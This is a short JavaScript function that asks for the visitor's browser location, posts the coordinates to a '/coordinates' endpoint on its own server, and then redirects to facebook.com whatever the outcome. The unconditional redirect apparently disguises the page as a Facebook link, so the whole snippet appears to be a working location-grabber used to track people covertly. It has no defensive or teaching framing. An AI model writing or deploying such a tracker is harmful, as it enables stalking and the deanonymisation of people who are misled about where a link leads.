function getCoordinates() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const data = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        };

        fetch("/coordinates", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        })
        .then(res => {
          // Redirect to Facebook after sending coordinates
          window.location.href = "https://facebook.com";
        })
        .catch(err => {
          alert("❌ Error: " + err.message);
          window.location.href = "https://facebook.com";
        });
      },
      () => {
        alert("❌ Location permission denied.");
        window.location.href = "https://facebook.com";
      }
    );
  } else {
    alert("❌ Geolocation not supported.");
    window.location.href = "https://facebook.com";
  }
}
